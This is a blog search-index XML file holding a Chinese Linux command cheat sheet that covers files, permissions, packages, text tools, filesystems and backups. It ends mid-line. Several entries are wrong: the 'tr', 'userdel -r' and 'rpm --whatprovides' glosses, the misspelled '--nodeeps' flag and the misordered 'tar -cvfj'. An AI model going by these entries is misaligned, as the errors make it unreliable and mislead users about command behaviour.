<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux语法</title>
      <link href="/2023/11/15/Linux%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/11/15/Linux%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">shutdown   //关机</span><br><span class="line">reboot     //重启</span><br><span class="line">ls</span><br><span class="line">ls --color=auto  //着色ls命令的输出</span><br><span class="line">alias  //允许在shell会话中定义临时别名</span><br><span class="line"></span><br><span class="line">unalias  //从一定义的别名中删除alias</span><br><span class="line">pwd   //打印工作目录/当前文件的绝对路径</span><br><span class="line">cd    //更改目录</span><br><span class="line">cp    //copy</span><br><span class="line">rm    //删除</span><br><span class="line">mv    //重命名</span><br><span class="line">mkdir  //创建目录</span><br><span class="line">man    //显示任何其他命令</span><br><span class="line">touch  //更新指定文件的访问和修改时间</span><br><span class="line">chmod   //快速更改文件的权限（只读：r；写入：w；执行：x）</span><br><span class="line">./     //直接从终端运行可执行文件</span><br><span class="line">sudo/su    //修改用户</span><br><span class="line">htop     //交互式流程查看器</span><br><span class="line">unzip    //解压</span><br><span class="line">apt/yum/pacman   //安装</span><br><span class="line">echo       //在终端显示定义的文本（print）</span><br><span class="line"> &gt;/&gt;&gt;    //输出重定向</span><br><span class="line">cat  //用于直接从终端创建、查看和连接文件。它主要用于在不打开图形文本编辑器的情况下预览文件</span><br><span class="line">ps  //可以查看当前shell会话正在运行的进程。它打印有关正在运行的程序的有用信息，如进程ID、TTY（电传打字机）、时间和命令名</span><br><span class="line">kill  //kill向终止它的进程发送一个TERM或kill信号</span><br><span class="line">ping  //测试连通性</span><br><span class="line">vim  //文本编辑器</span><br><span class="line">history  //显示枚举列表，使用过的命令</span><br><span class="line">passwd  //更改用户密码</span><br><span class="line">which  //输出shell命令的完整路径。如果它不能识别给定的命令，它将抛出一个错误</span><br><span class="line">shred   //会重复覆盖文件的内容，因此，给定的文件极难恢复</span><br><span class="line">less   //允许前后检查文件的程序</span><br><span class="line">tail  //打印文件内容的最后几行</span><br><span class="line">head   //打印文件的前几行（10）</span><br><span class="line">grep   //搜索匹配的行并打印</span><br><span class="line">whoami  //当前用户名</span><br><span class="line">whatis  //打印任何其他命令的单行说明，使其成为有用的参考</span><br><span class="line">wc   //返回文本文件中的字数</span><br><span class="line">uname （-a）  //打印可操作的系统信息</span><br><span class="line">neofetch  //CLI（命令行界面）工具，它在Linux发行版的ASCII徽标旁边显示有关系统的信息，如内核版本、shell和硬件</span><br><span class="line">find   //根据regex表达式在目录层次结构中搜索文件</span><br><span class="line">find [flags] [path] -name [expression]</span><br><span class="line"></span><br><span class="line">mount   //通过查看文件显示当前系统已挂载的所有设备</span><br><span class="line">mount [-fnrsvw] [-t vfstype] [-o options] device dir</span><br><span class="line">device：指明要挂载的设备</span><br><span class="line">dir：挂载点</span><br><span class="line"></span><br><span class="line">wget  //检索工具</span><br><span class="line">more       //查看文件内容</span><br></pre></td></tr></table></figure><h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arch 显示机器的处理器架构</span><br><span class="line">uname -m 显示机器的处理器架构</span><br><span class="line">uname -r 显示正在使用的内核版本 </span><br><span class="line">dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI) </span><br><span class="line">hdparm -i /dev/hda 罗列一个磁盘的架构特性 </span><br><span class="line">hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 </span><br><span class="line">cat /proc/cpuinfo 显示CPU info的信息 </span><br><span class="line">cat /proc/interrupts 显示中断 </span><br><span class="line">cat /proc/meminfo 校验内存使用 </span><br><span class="line">cat /proc/swaps 显示哪些swap被使用 </span><br><span class="line">cat /proc/version 显示内核的版本 </span><br><span class="line">cat /proc/net/dev 显示网络适配器及统计 </span><br><span class="line">cat /proc/mounts 显示已加载的文件系统 </span><br><span class="line">lspci -tv 罗列 PCI 设备 </span><br><span class="line">lsusb -tv 显示 USB 设备 </span><br><span class="line">date 显示系统日期 </span><br><span class="line">cal 2007 显示2007年的日历表 </span><br><span class="line">date 041217002007.00 设置日期和时间 - 月日时分年.秒 </span><br><span class="line">clock -w 将时间修改保存到 BIOS </span><br></pre></td></tr></table></figure><h4 id="关机-系统的关机、重启以及登出"><a href="#关机-系统的关机、重启以及登出" class="headerlink" title="关机 (系统的关机、重启以及登出 )"></a>关机 (系统的关机、重启以及登出 )</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now 关闭系统</span><br><span class="line">init 0 关闭系统</span><br><span class="line">telinit 0 关闭系统</span><br><span class="line">shutdown -h hours:minutes &amp; 按预定时间关闭系统 </span><br><span class="line">shutdown -c 取消按预定时间关闭系统 </span><br><span class="line">shutdown -r now 重启</span><br><span class="line">reboot 重启</span><br><span class="line">logout 注销 </span><br></pre></td></tr></table></figure><h4 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home 进入 &#x27;/ home&#x27; 目录&#x27; </span><br><span class="line">cd .. 返回上一级目录 </span><br><span class="line">cd ../.. 返回上两级目录 </span><br><span class="line">cd 进入个人的主目录 </span><br><span class="line">cd ~user1 进入个人的主目录 </span><br><span class="line">cd - 返回上次所在的目录 </span><br><span class="line">pwd 显示工作路径 </span><br><span class="line">ls 查看目录中的文件 </span><br><span class="line">ls -F 查看目录中的文件 </span><br><span class="line">ls -l 显示文件和目录的详细资料 </span><br><span class="line">ls -a 显示隐藏文件 </span><br><span class="line">ls *[0-9]* 显示包含数字的文件名和目录名 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tree 显示文件和目录由根目录开始的树形结构</span><br><span class="line">lstree 显示文件和目录由根目录开始的树形结构</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir dir1         // 创建一个叫做 &#x27;dir1&#x27; 的目录&#x27; </span><br><span class="line">mkdir dir1 dir2     //同时创建两个目录 </span><br><span class="line">mkdir -p /tmp/dir1/dir2     //创建一个目录树 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rm -f file1    //删除一个叫做 &#x27;file1&#x27; 的文件&#x27; </span><br><span class="line">rmdir dir1     //删除一个叫做 &#x27;dir1&#x27; 的目录&#x27; </span><br><span class="line">rm -rf dir1     //删除一个叫做 &#x27;dir1&#x27; 的目录并同时删除其内容 </span><br><span class="line">rm -rf dir1 dir2    //同时删除两个目录及它们的内容 </span><br><span class="line">mv dir1 new_dir      //重命名/移动 一个目录 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cp file1 file2      //复制一个文件 </span><br><span class="line">cp dir/* .          //复制一个目录下的所有文件到当前工作目录 </span><br><span class="line">cp -a /tmp/dir1 .      //复制一个目录到当前工作目录 </span><br><span class="line">cp -a dir1 dir2        //复制一个目录 </span><br><span class="line">cp -r dir1 dir2        //复制一个目录及子目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ln -s file1 lnk1        //创建一个指向文件或目录的软链接 </span><br><span class="line">ln file1 lnk1           //创建一个指向文件或目录的物理链接 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">touch -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm) </span><br><span class="line">file file1 outputs the mime type of the file as text </span><br><span class="line">iconv -l 列出已知的编码 </span><br><span class="line">iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding. </span><br><span class="line">find . -maxdepth 1 -name *.jpg -print -exec convert &quot;&#123;&#125;&quot; -resize 80x60 &quot;thumbs/&#123;&#125;&quot; \; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick) </span><br></pre></td></tr></table></figure><h4 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name file1 从 &#x27;/&#x27; 开始进入根文件系统搜索文件和目录 </span><br><span class="line">find / -user user1 搜索属于用户 &#x27;user1&#x27; 的文件和目录 </span><br><span class="line">find /home/user1 -name \*.bin 在目录 &#x27;/ home/user1&#x27; 中搜索带有&#x27;.bin&#x27; 结尾的文件 </span><br><span class="line">find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件 </span><br><span class="line">find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 </span><br><span class="line">find / -name \*.rpm -exec chmod 755 &#x27;&#123;&#125;&#x27; \; 搜索以 &#x27;.rpm&#x27; 结尾的文件并定义其权限 </span><br><span class="line">find / -xdev -name \*.rpm 搜索以 &#x27;.rpm&#x27; 结尾的文件，忽略光驱、捷盘等可移动设备 </span><br><span class="line">locate \*.ps 寻找以 &#x27;.ps&#x27; 结尾的文件 - 先运行 &#x27;updatedb&#x27; 命令 </span><br><span class="line">whereis halt 显示一个二进制文件、源码或man的位置 </span><br><span class="line">which halt 显示一个二进制文件或可执行文件的完整路径 </span><br></pre></td></tr></table></figure><h4 id="挂载一个文件系统"><a href="#挂载一个文件系统" class="headerlink" title="挂载一个文件系统"></a>挂载一个文件系统</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 &#x27;/ mnt/hda2&#x27; 已经存在 </span><br><span class="line">umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 &#x27;/ mnt/hda2&#x27; 退出 </span><br><span class="line">fuser -km /mnt/hda2 当设备繁忙时强制卸载 </span><br><span class="line">umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用 </span><br><span class="line">mount /dev/fd0 /mnt/floppy 挂载一个软盘 </span><br><span class="line">mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom </span><br><span class="line">mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom </span><br><span class="line">mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom </span><br><span class="line">mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件 </span><br><span class="line">mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 </span><br><span class="line">mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备 </span><br><span class="line">mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 </span><br></pre></td></tr></table></figure><h4 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a><strong>磁盘空间</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">df -h 显示已经挂载的分区列表 </span><br><span class="line">ls -lSr |more 以尺寸大小排列文件和目录 </span><br><span class="line">du -sh dir1 估算目录 &#x27;dir1&#x27; 已经使用的磁盘空间&#x27; </span><br><span class="line">du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 </span><br><span class="line">rpm -q -a --qf &#x27;%10&#123;SIZE&#125;t%&#123;NAME&#125;n&#x27; | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) </span><br><span class="line">dpkg-query -W -f=&#x27;$&#123;Installed-Size;10&#125;t$&#123;Package&#125;n&#x27; | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 ([ubuntu](https://so.csdn.net/so/search?q=ubuntu&amp;spm=1001.2101.3001.7020), debian类系统) </span><br></pre></td></tr></table></figure><h4 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a><strong>用户和群组</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">groupadd group_name 创建一个新用户组 </span><br><span class="line">groupdel group_name 删除一个用户组 </span><br><span class="line">groupmod -n new_group_name old_group_name 重命名一个用户组 </span><br><span class="line">useradd -c &quot;Name Surname &quot; -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 &quot;admin&quot; 用户组的用户 </span><br><span class="line">useradd user1 创建一个新用户 </span><br><span class="line">userdel -r user1 删除一个用户 ( &#x27;-r&#x27; 排除主目录) </span><br><span class="line">usermod -c &quot;User FTP&quot; -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性 </span><br><span class="line">passwd 修改口令 </span><br><span class="line">passwd user1 修改一个用户的口令 (只允许root执行) </span><br><span class="line">chage -E 2005-12-31 user1 设置用户口令的失效期限 </span><br><span class="line">pwck 检查 &#x27;/etc/passwd&#x27; 的文件格式和语法修正以及存在的用户 </span><br><span class="line">grpck 检查 &#x27;/etc/passwd&#x27; 的文件格式和语法修正以及存在的群组 </span><br><span class="line">newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 </span><br></pre></td></tr></table></figure><h4 id="文件的权限-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a><strong>文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lh 显示权限 </span><br><span class="line">ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示 </span><br><span class="line">chmod ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限 </span><br><span class="line">chmod go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限 </span><br><span class="line">chown user1 file1 改变一个文件的所有人属性 </span><br><span class="line">chown -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 </span><br><span class="line">chgrp group1 file1 改变文件的群组 </span><br><span class="line">chown user1:group1 file1 改变一个文件的所有人和群组属性 </span><br><span class="line">find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 </span><br><span class="line">chmod u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限 </span><br><span class="line">chmod u-s /bin/file1 禁用一个二进制文件的 SUID位 </span><br><span class="line">chmod g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的 </span><br><span class="line">chmod g-s /home/public 禁用一个目录的 SGID 位 </span><br><span class="line">chmod o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件 </span><br><span class="line">chmod o-t /home/public 禁用一个目录的 STIKY 位 </span><br></pre></td></tr></table></figure><h4 id="文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a>文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +a file1 只允许以追加方式读写文件 </span><br><span class="line">chattr +c file1 允许这个文件能被内核自动压缩/解压 </span><br><span class="line">chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 </span><br><span class="line">chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 </span><br><span class="line">chattr +s file1 允许一个文件被安全地删除 </span><br><span class="line">chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 </span><br><span class="line">chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 </span><br><span class="line">lsattr 显示特殊的属性 </span><br></pre></td></tr></table></figure><h4 id="打包和压缩文件"><a href="#打包和压缩文件" class="headerlink" title="打包和压缩文件"></a><strong>打包和压缩文件</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bunzip2 file1.bz2 解压一个叫做 &#x27;file1.bz2&#x27;的文件 </span><br><span class="line">bzip2 file1 压缩一个叫做 &#x27;file1&#x27; 的文件 </span><br><span class="line">gunzip file1.gz 解压一个叫做 &#x27;file1.gz&#x27;的文件 </span><br><span class="line">gzip file1 压缩一个叫做 &#x27;file1&#x27;的文件 </span><br><span class="line">gzip -9 file1 最大程度压缩 </span><br><span class="line">rar a file1.rar test_file 创建一个叫做 &#x27;file1.rar&#x27; 的包 </span><br><span class="line">rar a file1.rar file1 file2 dir1 同时压缩 &#x27;file1&#x27;, &#x27;file2&#x27; 以及目录 &#x27;dir1&#x27; </span><br><span class="line">rar x file1.rar 解压rar包 </span><br><span class="line">unrar x file1.rar 解压rar包 </span><br><span class="line">tar -cvf archive.tar file1 创建一个非压缩的 tarball </span><br><span class="line">tar -cvf archive.tar file1 file2 dir1 创建一个包含了 &#x27;file1&#x27;, &#x27;file2&#x27; 以及 &#x27;dir1&#x27;的档案文件 </span><br><span class="line">tar -tf archive.tar 显示一个包中的内容 </span><br><span class="line">tar -xvf archive.tar 释放一个包 </span><br><span class="line">tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下 </span><br><span class="line">tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包 </span><br><span class="line">tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包 </span><br><span class="line">tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包 </span><br><span class="line">tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包 </span><br><span class="line">zip file1.zip file1 创建一个zip格式的压缩包 </span><br><span class="line">zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 </span><br><span class="line">unzip file1.zip 解压一个zip格式压缩包 </span><br></pre></td></tr></table></figure><h4 id="RPM-包-（Fedora-Redhat及类似系统）"><a href="#RPM-包-（Fedora-Redhat及类似系统）" class="headerlink" title="RPM 包 - （Fedora, Redhat及类似系统）"></a><strong>RPM 包 - （Fedora, Redhat及类似系统）</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh package.rpm 安装一个rpm包 </span><br><span class="line">rpm -ivh --nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告 </span><br><span class="line">rpm -U package.rpm 更新一个rpm包但不改变其配置文件 </span><br><span class="line">rpm -F package.rpm 更新一个确定已经安装的rpm包 </span><br><span class="line">rpm -e package_name.rpm 删除一个rpm包 </span><br><span class="line">rpm -qa 显示系统中所有已经安装的rpm包 </span><br><span class="line">rpm -qa | grep httpd 显示所有名称中包含 &quot;httpd&quot; 字样的rpm包 </span><br><span class="line">rpm -qi package_name 获取一个已安装包的特殊信息 </span><br><span class="line">rpm -qg &quot;System Environment/Daemons&quot; 显示一个组件的rpm包 </span><br><span class="line">rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表 </span><br><span class="line">rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表 </span><br><span class="line">rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表 </span><br><span class="line">rpm -q package_name --whatprovides 显示一个rpm包所占的体积 </span><br><span class="line">rpm -q package_name --scripts 显示在安装/删除期间所执行的脚本l </span><br><span class="line">rpm -q package_name --changelog 显示一个rpm包的修改历史 </span><br><span class="line">rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 </span><br><span class="line">rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 </span><br><span class="line">rpm --import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 </span><br><span class="line">rpm --checksig package.rpm 确认一个rpm包的完整性 </span><br><span class="line">rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性 </span><br><span class="line">rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间 </span><br><span class="line">rpm -Va 检查系统中所有已安装的rpm包- 小心使用 </span><br><span class="line">rpm -Vp package.rpm 确认一个rpm包还未安装 </span><br><span class="line">rpm2cpio package.rpm | cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件 </span><br><span class="line">rpm -ivh /usr/src/redhat/RPMS/`arch`/package.rpm 从一个rpm源码安装一个构建好的包 </span><br><span class="line">rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 </span><br></pre></td></tr></table></figure><h4 id="YUM-软件包升级器-（Fedora-RedHat及类似系统）"><a href="#YUM-软件包升级器-（Fedora-RedHat及类似系统）" class="headerlink" title="YUM 软件包升级器 - （Fedora, RedHat及类似系统）"></a>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install package_name 下载并安装一个rpm包 </span><br><span class="line">yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 </span><br><span class="line">yum update package_name.rpm 更新当前系统中所有安装的rpm包 </span><br><span class="line">yum update package_name 更新一个rpm包 </span><br><span class="line">yum remove package_name 删除一个rpm包 </span><br><span class="line">yum list 列出当前系统中安装的所有包 </span><br><span class="line">yum search package_name 在rpm仓库中搜寻软件包 </span><br><span class="line">yum clean packages 清理rpm缓存删除下载的包 </span><br><span class="line">yum clean headers 删除所有头文件 </span><br><span class="line">yum clean all 删除所有缓存的包和头文件</span><br></pre></td></tr></table></figure><h4 id="APT-软件工具-Debian-Ubuntu-以及类似系统"><a href="#APT-软件工具-Debian-Ubuntu-以及类似系统" class="headerlink" title="APT 软件工具 (Debian, Ubuntu 以及类似系统)"></a>APT 软件工具 (Debian, Ubuntu 以及类似系统)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install package_name 安装/更新一个 deb 包 </span><br><span class="line">apt-cdrom install package_name 从光盘安装/更新一个 deb 包 </span><br><span class="line">apt-get update 升级列表中的软件包 </span><br><span class="line">apt-get upgrade 升级所有已安装的软件 </span><br><span class="line">apt-get remove package_name 从系统删除一个deb包 </span><br><span class="line">apt-get check 确认依赖的软件仓库正确 </span><br><span class="line">apt-get clean 从下载的软件包中清理缓存 </span><br><span class="line">apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 </span><br></pre></td></tr></table></figure><h4 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1 从第一个字节开始正向查看文件的内容 </span><br><span class="line">tac file1 从最后一行开始反向查看一个文件的内容 </span><br><span class="line">more file1 查看一个长文件的内容 </span><br><span class="line">less file1 类似于 &#x27;more&#x27; 命令，但是它允许在文件中和正向操作一样的反向操作 </span><br><span class="line">head -2 file1 查看一个文件的前两行 </span><br><span class="line">tail -2 file1 查看一个文件的最后两行 </span><br><span class="line">tail -f /var/log/messages 实时查看被添加到一个文件中的内容</span><br></pre></td></tr></table></figure><h4 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1 file2 ... | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT </span><br><span class="line">cat file1 | command( sed, grep, awk, grep, etc...) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中 </span><br><span class="line">cat file1 | command( sed, grep, awk, grep, etc...) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中 </span><br><span class="line">cat -n file1 标示文件的行数 </span><br><span class="line">cat example.txt | awk &#x27;NR%2==1&#x27; 删除example.txt文件中的所有偶数行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grep Aug /var/log/messages 在文件 &#x27;/var/log/messages&#x27;中查找关键词&quot;Aug&quot; </span><br><span class="line">grep ^Aug /var/log/messages 在文件 &#x27;/var/log/messages&#x27;中查找以&quot;Aug&quot;开始的词汇 </span><br><span class="line">grep [0-9] /var/log/messages 选择 &#x27;/var/log/messages&#x27; 文件中所有包含数字的行 </span><br><span class="line">grep Aug -R /var/log/* 在目录 &#x27;/var/log&#x27; 及随后的目录中搜索字符串&quot;Aug&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sed &#x27;s/stringa1/stringa2/g&#x27; example.txt 将example.txt文件中的 &quot;string1&quot; 替换成 &quot;string2&quot; </span><br><span class="line">sed &#x27;/^$/d&#x27; example.txt 从example.txt文件中删除所有空白行 </span><br><span class="line">sed &#x27;/ *#/d; /^$/d&#x27; example.txt 从example.txt文件中删除所有注释和空白行  </span><br><span class="line">sed -e &#x27;1d&#x27; result.txt 从文件example.txt 中排除第一行 </span><br><span class="line">sed -n &#x27;/stringa1/p&#x27; 查看只包含词汇 &quot;string1&quot;的行 </span><br><span class="line">sed -e &#x27;s/ *$//&#x27; example.txt 删除每一行最后的空白字符 </span><br><span class="line">sed -e &#x27;s/stringa1//g&#x27; example.txt 从文档中只删除词汇 &quot;string1&quot; 并保留剩余全部 </span><br><span class="line">sed -n &#x27;1,5p;5q&#x27; example.txt 查看从第一行到第5行内容 </span><br><span class="line">sed -n &#x27;5p;5q&#x27; example.txt 查看第5行 </span><br><span class="line">sed -e &#x27;s/00*/0/g&#x27; example.txt 用单个零替换多个零 </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">echo &#x27;esempio&#x27; | tr &#x27;[:lower:]&#x27; &#x27;[:upper:]&#x27; 合并上下单元格内容</span><br><span class="line">echo a b c | awk &#x27;&#123;print $1&#125;&#x27; 查看一行第一栏 </span><br><span class="line">echo a b c | awk &#x27;&#123;print $1,$3&#125;&#x27; 查看一行的第一和第三栏 </span><br><span class="line">paste file1 file2 合并两个文件或两栏的内容 </span><br><span class="line">paste -d &#x27;+&#x27; file1 file2 合并两个文件或两栏的内容，中间用&quot;+&quot;区分 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sort file1 file2 排序两个文件的内容 </span><br><span class="line">sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份) </span><br><span class="line">sort file1 file2 | uniq -u 删除交集，留下其他的行 </span><br><span class="line">sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">comm -1 file1 file2 比较两个文件的内容只删除 &#x27;file1&#x27; 所包含的内容 </span><br><span class="line">comm -2 file1 file2 比较两个文件的内容只删除 &#x27;file2&#x27; 所包含的内容 </span><br><span class="line">comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 </span><br></pre></td></tr></table></figure><h4 id="字符设置和文件格式转换"><a href="#字符设置和文件格式转换" class="headerlink" title="字符设置和文件格式转换"></a>字符设置和文件格式转换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX </span><br><span class="line">unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS </span><br><span class="line">recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html </span><br><span class="line">recode -l | more 显示所有允许的转换格式 </span><br></pre></td></tr></table></figure><h4 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块 </span><br><span class="line">fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性 </span><br><span class="line">fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 </span><br><span class="line">e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 </span><br><span class="line">e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 </span><br><span class="line">fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 </span><br><span class="line">fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性 </span><br><span class="line">fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 </span><br><span class="line">dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 </span><br></pre></td></tr></table></figure><h4 id="初始化一个文件系统"><a href="#初始化一个文件系统" class="headerlink" title="初始化一个文件系统"></a>初始化一个文件系统</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfs /dev/hda1 在hda1分区创建一个文件系统 </span><br><span class="line">mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 </span><br><span class="line">mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统 </span><br><span class="line">mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统 </span><br><span class="line">fdformat -n /dev/fd0 格式化一个软盘 </span><br><span class="line">mkswap /dev/hda3 创建一个swap文件系统 </span><br></pre></td></tr></table></figure><h4 id="SWAP文件系统"><a href="#SWAP文件系统" class="headerlink" title="SWAP文件系统"></a>SWAP文件系统</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkswap /dev/hda3 创建一个swap文件系统 </span><br><span class="line">swapon /dev/hda3 启用一个新的swap文件系统 </span><br><span class="line">swapon /dev/hda2 /dev/hdb3 启用两个swap分区 </span><br></pre></td></tr></table></figure><h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump -0aj -f /tmp/home0.bak /home 制作一个 &#x27;/home&#x27; 目录的完整备份 </span><br><span class="line">dump -1aj -f /tmp/home0.bak /home 制作一个 &#x27;/home&#x27; 目录的交互式备份 </span><br><span class="line">restore -if /tmp/home0.bak 还原一个交互式备份 </span><br><span class="line">rsync -rogpav --delete /home /tmp 同步两边的目录 </span><br><span class="line">rsync -rogpav -e ssh --delete /home ip_address:/tmp 